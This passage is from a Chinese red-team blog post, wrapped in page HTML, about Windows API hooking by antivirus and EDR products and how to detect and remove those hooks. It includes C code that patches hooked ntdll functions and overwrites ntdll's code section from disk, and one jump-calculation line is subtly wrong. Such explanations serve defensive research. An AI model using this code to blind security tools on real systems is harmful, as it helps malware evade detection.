@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2026/02/14/unhookdll/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2026/02/14/unhookdll/","path":"2026/02/14/unhookdll/","title":"Api Unhook"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Api Unhook | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#protection-rings"><span class="nav-text">protection rings</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ring3-to-Ring0"><span class="nav-text">Ring3 to Ring0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSDT"><span class="nav-text">SSDT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hook"><span class="nav-text">Hook</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hook%E6%A3%80%E6%B5%8B"><span class="nav-text">Hook检测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#UnHook-%E6%89%8B%E6%AE%B5"><span class="nav-text">UnHook 手段</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E8%A1%A5%E5%87%BD%E6%95%B0"><span class="nav-text">修补函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A3%81%E7%9B%98%E9%87%8D%E8%BD%BD"><span class="nav-text">磁盘重载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8A%82%E6%98%A0%E5%B0%84"><span class="nav-text">节映射</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8C%82%E8%B5%B7%E8%BF%9B%E7%A8%8B"><span class="nav-text">挂起进程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Syscall"><span class="nav-text">Syscall</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%B4%E6%8E%A5%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-text">间接系统调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B4%E6%8E%A5%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-text">直接系统调用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9"><span class="nav-text">硬件断点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E4%BA%8B%E4%BB%B6"><span class="nav-text">调试事件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Avrf%E5%9B%9E%E8%B0%83"><span class="nav-text">Avrf回调</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87"><span class="nav-text">其他绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%B0%E4%BB%A3AV-EDR%E4%BD%BF%E7%94%A8hook%E7%9A%84%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5"><span class="nav-text">现代AV&#x2F;EDR使用hook的防御手段</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSDT-hook"><span class="nav-text">SSDT hook</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A1%AC%E4%BB%B6%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%EF%BC%88Intel-VT-AMD-SVM%EF%BC%89%E6%A3%80%E6%B5%8B"><span class="nav-text">硬件虚拟化技术（Intel VT &#x2F;AMD SVM）检测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83"><span class="nav-text">内核回调</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/14/unhookdll/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Api Unhook | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Api Unhook
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-02-14 00:00:00" itemprop="dateCreated datePublished" datetime="2026-02-14T00:00:00+08:00">2026-02-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Red-Team/" itemprop="url" rel="index"><span itemprop="name">Red-Team</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/flying.jpg" alt="flying"></p>
+<a id="more"></a>
+
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="protection-rings"><a href="#protection-rings" class="headerlink" title="protection rings"></a>protection rings</h2><p>保护环，是计算机体系结构中用来描述不同权限级别的一种机制。它们的设计目的是为了实现对系统资源的访问控制，确保程序和用户在执行时的安全性和隔离性。</p>
+<p>内核模式（Ring 0、0环）是操作系统的核心部分，具有对所有硬件资源和内存的完全控制权限。</p>
+<p>用户模式（Ring 3、3环）是用户程序、应用程序和其他非核心服务运行的地方。</p>
+<h2 id="Ring3-to-Ring0"><a href="#Ring3-to-Ring0" class="headerlink" title="Ring3 to Ring0"></a>Ring3 to Ring0</h2><p>在用户模式下调用API时往往最后都是通过syscall调用，在内核模式中进行真正的处理，具体过程不进行展开，可以搜索Windows API函数分析、Ring3到Ring0等文章。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260131181542056.png" alt="image-20260131181542056"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260131175756468.png" alt="image-20260131175756468"></p>
+<h2 id="SSDT"><a href="#SSDT" class="headerlink" title="SSDT"></a>SSDT</h2><p>系统服务描述符表（System Service Descriptor Table，简称SSDT）是一个在内核空间的函数索引表，通过接受syscall传入的 系统服务号（System Service ID，System Service Number, System Call Number，简称SSN）来返回对应的函数地址。类似如下结构</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Function			SSN		Kernel address</span><br><span class="line">NtCreateFile		55		0x5ea54623</span><br><span class="line">NtCreateIRTimer		ab		0x6bcd1576</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260131224802140.png" alt="image-20260131224802140"></p>
+<h2 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h2><p>关于hook技术的实现，不是本文重点。总体上分为两类：</p>
+<ul>
+<li>修改函数代码：Inline hook</li>
+<li>修改函数地址：IAT hook、SSDT hook、IRP hook、IDT hook等</li>
+</ul>
+<p>程序在运行时一定会调用某些系统调用，EDR为了检测这些调用行为是正常的还是恶意的，会去主动hook与调用相关的函数或表，如Windows API、SSDT等，在调用触发hook时，EDR/AV会执行自定义的检测逻辑。hook可以选择在用户态或者内核态进行，在遥远的x86的XP时代中，选择了最直接的内核态hook，通过修改 SSDT 内核函数的地址将调用重定向到他们自己的驱动程序，从而实现检测。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260131231627638.png" alt="image-20260131231627638"></p>
+<p> 如果内核轻松可以进行修改，将导致内核稳定性的缺失，因此微软为了保护其操作系统，于2005年的X64版本系统中推出了 <strong>内核补丁保护（Kernel Patch Protection，KPP，简称 PatchGuard）</strong>，PatchGuard 是一种主动安全机制，它会定期检查多个关键 Windows 内核结构的状态，如果其中一个结构被除合法内核代码之外的任何内容修改，PatchGuard 就会发出致命的系统错误从而蓝屏重启。被禁止的修改包括：</p>
+<ul>
+<li>Modifying system service descriptor tables（SSDT）</li>
+<li>Modifying the interrupt descriptor table</li>
+<li>Modifying the global descriptor table</li>
+<li>Using kernel stacks not allocated by the kernel</li>
+<li>Modifying or patching code contained within the kernel itself, or the HAL or NDIS kernel libraries</li>
+</ul>
+<p>可以看到现代EDR由于 PatchGuard 的引进，直接使SSDT hook失效，不过微软为了解决这个问题并使安全产品能够再次监控系统，引入了新的机制 <strong>回调对象</strong>，本文不再展开。同时hook技术也转向了用户态，通过对常见的dll，例如ntdll.dll、kernel32.dll、user32.dll等进行hook，常见使用Inline hook修改函数代码，插入jmp指令，跳转到自定义的检测逻辑。至此EDR有了回调对象机制和用户态hook两把利剑。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260131235242771.png" alt="image-20260131235242771"></p>
+<h1 id="Hook检测"><a href="#Hook检测" class="headerlink" title="Hook检测"></a>Hook检测</h1><p>通过调试，在程序启动过程中会被AV/EDR注入dll</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201131125111.png" alt="image-20260201131125111"></p>
+<p>添加了白名单后的干净程序是这样的，只加载必须的系统dll</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201133529407.png" alt="image-20260201133529407"></p>
+<p>查看导出函数会发现很多关于hook的函数</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201132845746.png" alt="image-20260201132845746"></p>
+<p>debug看看VirtualAlloc的详细情况，首先在kernel32.dll中jmp进入kernelbase</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201131525229.png" alt="image-20260201131525229"></p>
+<p>kernelbase.dll中调用ZwAllocateVirtualMemory</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201131628295.png" alt="image-20260201131628295"></p>
+<p>在ntdll.dll中看到ZwAllocateVirtualMemory</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201131938311.png" alt="image-20260201131938311"></p>
+<p>然后与添加白名单后进行比对，发现ZwAllocateVirtualMemory没有任何变化，也就意味着该函数没有被hook</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201133717218.png" alt="image-20260201133717218"></p>
+<p>在ntdll中挑选其他函数进行对比能明显的发现被hook的函数在进入系统调用之前被替换为 <strong>jmp</strong> 指令，跳转到AV/EDR检测</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201133051740.png" alt="image-20260201133051740"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260201133846335.png" alt="image-20260201133846335"></p>
+<p>针对hook的检测有如下常见策略：</p>
+<ul>
+<li>函数开头字节比较：通过对比，被hook的函数开头是 <code>E9 或 E8</code> 干净的函数为 <code>4C 8B D1 B8</code> ，那么以函数是否存在E9/E8作为检测点</li>
+<li>完整性校验：函数所在页面计算哈希或签名，检测是否被改写</li>
+<li>内存与映像比较：比较内存中的API函数与其磁盘版本的API函数字节是否一致</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions">https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscall-functions</a></p>
+<p>比较所有导出函数开头字节</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void enumFunctionPatch() &#123;</span><br><span class="line">	PDWORD functionAddress &#x3D; (PDWORD)0;</span><br><span class="line"></span><br><span class="line">    HMODULE libraryBase &#x3D; GetModuleHandleW(L&quot;ntdll&quot;);</span><br><span class="line">    PIMAGE_DOS_HEADER dosHeader &#x3D; (PIMAGE_DOS_HEADER)libraryBase;</span><br><span class="line">	PIMAGE_NT_HEADERS imageNTHeaders &#x3D; (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Locate export address table</span><br><span class="line">	DWORD_PTR exportDirectoryRVA &#x3D; imageNTHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY imageExportDirectory &#x3D; (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Offsets to list of exported functions and their names</span><br><span class="line">	PDWORD addresOfFunctionsRVA &#x3D; (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">	PDWORD addressOfNamesRVA &#x3D; (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-&gt;AddressOfNames);</span><br><span class="line">	PWORD addressOfNameOrdinalsRVA &#x3D; (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Iterate through exported functions of ntdll</span><br><span class="line">	for (DWORD i &#x3D; 0; i &lt; imageExportDirectory-&gt;NumberOfNames; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F; Resolve exported function name</span><br><span class="line">		DWORD functionNameRVA &#x3D; addressOfNamesRVA[i];</span><br><span class="line">		DWORD_PTR functionNameVA &#x3D; (DWORD_PTR)libraryBase + functionNameRVA;</span><br><span class="line">		char* functionName &#x3D; (char*)functionNameVA;</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Resolve exported function address</span><br><span class="line">		DWORD_PTR functionAddressRVA &#x3D; 0;</span><br><span class="line">		functionAddressRVA &#x3D; addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];</span><br><span class="line">		functionAddress &#x3D; (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Syscall stubs start with these bytes</span><br><span class="line">		unsigned char syscallPrologue[4] &#x3D; &#123; 0x4c, 0x8b, 0xd1, 0xb8 &#125;;</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Only interested in Nt|Zw functions</span><br><span class="line">		if (strncmp(functionName, (char*)&quot;Nt&quot;, 2) &#x3D;&#x3D; 0 || strncmp(functionName, (char*)&quot;Zw&quot;, 2) &#x3D;&#x3D; 0)</span><br><span class="line">		&#123;</span><br><span class="line">			&#x2F;&#x2F; Check if the first 4 instructions of the exported function are the same as the sycall&#39;s prologue</span><br><span class="line">			if (memcmp(functionAddress, syscallPrologue, 4) !&#x3D; 0) &#123;</span><br><span class="line"></span><br><span class="line">				if (*((unsigned char*)functionAddress) &#x3D;&#x3D; 0xE9) &#x2F;&#x2F; first byte is a jmp instruction, where does it jump to?</span><br><span class="line">				&#123;</span><br><span class="line">					&#x2F;&#x2F; jmpTargetAddr &#x3D; funcAddr + 5(length of jmp) + offset()</span><br><span class="line">					DWORD jumpTargetRelative &#x3D; *((PDWORD)((char*)functionAddress + 1));</span><br><span class="line">					printf(&quot;Relative : %p &quot;, jumpTargetRelative);</span><br><span class="line"></span><br><span class="line">					PDWORD jumpTarget &#x3D; functionAddress + 5 + jumpTargetRelative;</span><br><span class="line">					printf(&quot; Jump target address: %p &quot;, jumpTarget);</span><br><span class="line"></span><br><span class="line">					char moduleNameBuffer[512];</span><br><span class="line">					GetMappedFileNameA(GetCurrentProcess(), jumpTarget, moduleNameBuffer, sizeof(moduleNameBuffer));</span><br><span class="line">					printf(&quot;Hooked: %s : %p into module %s\n&quot;, functionName, functionAddress, moduleNameBuffer);</span><br><span class="line">				&#125;</span><br><span class="line">				else</span><br><span class="line">				&#123;</span><br><span class="line">					printf(&quot;Potentially hooked: %s : %p\n&quot;, functionName, functionAddress);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>内存与映像比较</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void isFunctionPatch(LPCWSTR dllname,LPCSTR funcname) &#123;</span><br><span class="line">    HMODULE memModule &#x3D; GetModuleHandleA(&quot;ntdll.dll&quot;);</span><br><span class="line">    printf(&quot;[*] ntdll.dll in mem addr: 0x%p \n&quot;, memModule);</span><br><span class="line"></span><br><span class="line">    FARPROC memProc &#x3D; GetProcAddress(memModule, funcname);</span><br><span class="line">    printf(&quot;[*] %s in mem addr: 0x%p \n\n&quot;, funcname, memProc);</span><br><span class="line"></span><br><span class="line">    HMODULE diskModule &#x3D; LoadLibraryExW(dllname,nullptr, DONT_RESOLVE_DLL_REFERENCES);</span><br><span class="line">    if (!diskModule) &#123;</span><br><span class="line">        printf(&quot;[-] LoadLib Err&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;[*] %ls in disk addr: 0x%p \n&quot;, dllname,diskModule);</span><br><span class="line"></span><br><span class="line">    FARPROC diskProc &#x3D; GetProcAddress(diskModule, funcname);</span><br><span class="line">    if (!diskProc) &#123;</span><br><span class="line">        printf(&quot;[-] Get %s Err \n&quot;, funcname);</span><br><span class="line">        FreeLibrary(diskModule);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;[*] %s in disk addr: 0x%p \n\n&quot;, funcname,diskProc);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    BYTE membyte[4];</span><br><span class="line">    memcpy(membyte, memProc, sizeof(membyte));</span><br><span class="line">    printf(&quot;[*] %s in mem byte: &quot;, funcname);</span><br><span class="line">    for (int i &#x3D; 0; i &lt; sizeof(membyte); i++) &#123;</span><br><span class="line">        printf(&quot;%02X &quot;, membyte[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">    BYTE diskbyte[4];</span><br><span class="line">    memcpy(diskbyte, diskProc, sizeof(diskbyte));</span><br><span class="line">    printf(&quot;[*] %s in disk byte: &quot;,funcname);</span><br><span class="line">    for (int i &#x3D; 0; i &lt; sizeof(diskbyte); i++) &#123;</span><br><span class="line">        printf(&quot;%02X &quot;, diskbyte[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;\n&quot;);</span><br><span class="line">    </span><br><span class="line">    bool patched &#x3D; memcmp(diskbyte, membyte, sizeof(membyte)) !&#x3D; 0;</span><br><span class="line">    FreeLibrary(diskModule);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line">isFunctionPatch(L&quot;C:\\Users\\admin\\Desktop\\ntdll.dll&quot;,&quot;ZwOpenProcess&quot;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="UnHook-手段"><a href="#UnHook-手段" class="headerlink" title="UnHook 手段"></a>UnHook 手段</h1><p>unhook手段是为了获取到干净的dll、函数。可以使用 寻找未被hook的函数、patch函数、重映射、syscall、自定义跳转、IAT、EAT等手段，在获取到干净的dll后，<strong>可以覆盖原dll，或者通过解析导出表计算地址使用干净dll中的干净函数。</strong></p>
+<p>计算导出表并使用干净函数，下文不再记录该方式：<a target="_blank" rel="noopener" href="https://idiotc4t.com/defense-evasion/load-ntdll-too">https://idiotc4t.com/defense-evasion/load-ntdll-too</a></p>
+<h2 id="修补函数"><a href="#修补函数" class="headerlink" title="修补函数"></a>修补函数</h2><p>通过 WriteProcessMemory 等函数将原来的指令字节写到被hook的位置，从而覆盖jmp指令，恢复原始状态，以ZwOpenProcess为例</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void FixFunction(LPCSTR dllname, LPCSTR funcname, LPCSTR fixbyte) &#123;</span><br><span class="line">	HMODULE memModule &#x3D; GetModuleHandleA(dllname);</span><br><span class="line">	FARPROC memProc &#x3D; GetProcAddress(memModule, funcname);</span><br><span class="line">	printf(&quot;[+] %s address is : %p\n&quot;, funcname, memProc);</span><br><span class="line">	if (WriteProcessMemory(GetCurrentProcess(), memProc, fixbyte, sizeof(fixbyte), NULL)) &#123;</span><br><span class="line">		printf(&quot;[+] %s unhooking done!\n&quot;, funcname);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"># FixFunction(&quot;ntdll&quot;,&quot;ZwOpenProcess&quot;,&quot;\x4C\x8B\xD1\xB8\x26\x00\x00\x00&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>成功修补函数</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260205012448835.png" alt="image-20260205012448835"></p>
+<h2 id="磁盘重载"><a href="#磁盘重载" class="headerlink" title="磁盘重载"></a>磁盘重载</h2><p>通过读取本地磁盘上dll并使用函数组合将文件映射为 <strong>memory mapped file（Mapped File Section）</strong>从而引入第二个被载入到内存中的干净dll，映射结果Type为 MEM_MAPPED，这与Image Section的映射是有区别的。</p>
+<p>以下路线可以实现磁盘重载：</p>
+<ul>
+<li>CreateFile + CreateFileMapping + MapViewOfFile</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HANDLE hntFile &#x3D; CreateFileA(&quot;C:\\Windows\\system32\\ntdll.dll&quot;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);</span><br><span class="line">HANDLE hntMapping &#x3D; CreateFileMappingA(hntFile, NULL, PAGE_READONLY| SEC_IMAGE,0,0,NULL);</span><br><span class="line">LPVOID DiskNtdllBase &#x3D; MapViewOfFile(hntMapping, FILE_MAP_READ, 0, 0, 0);</span><br><span class="line">	...</span><br><span class="line">for (WORD i &#x3D; 0; i &lt; memNtheader-&gt;FileHeader.NumberOfSections; i++, memSectionHeader++) &#123;</span><br><span class="line">	if (!strcmp((char*)memSectionHeader-&gt;Name, (char*)&quot;.text&quot;)) &#123;</span><br><span class="line">		DWORD oldProtection &#x3D; 0;</span><br><span class="line">		bool isProtected &#x3D; VirtualProtect((LPVOID)((BYTE*)memNtdllBase + memSectionHeader-&gt;VirtualAddress), memSectionHeader-&gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;oldProtection);</span><br><span class="line">		if (!isProtected) &#123;</span><br><span class="line">			printf(&quot;[-] Failed in VirtualProtect1 (%u)\n&quot;, GetLastError());</span><br><span class="line">		&#125;</span><br><span class="line">		memcpy((LPVOID)((BYTE*)memNtdllBase + memSectionHeader-&gt;VirtualAddress), (LPVOID)((BYTE*)DiskNtdllBase + memSectionHeader-&gt;VirtualAddress), memSectionHeader-&gt;Misc.VirtualSize);</span><br><span class="line">		isProtected &#x3D; VirtualProtect((LPVOID)((BYTE*)memNtdllBase + memSectionHeader-&gt;VirtualAddress), memSectionHeader-&gt;Misc.VirtualSize, oldProtection, &amp;oldProtection);</span><br><span class="line">		if (!isProtected) &#123;</span><br><span class="line">			printf(&quot;[-] Failed in VirtualProtect2 (%u)\n&quot;, GetLastError());</span><br><span class="line">		&#125;</span><br><span class="line">		printf(&quot;[*] rewrite .text success&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="节映射"><a href="#节映射" class="headerlink" title="节映射"></a>节映射</h2><p>这里先给出与磁盘重载的区别：</p>
+<blockquote>
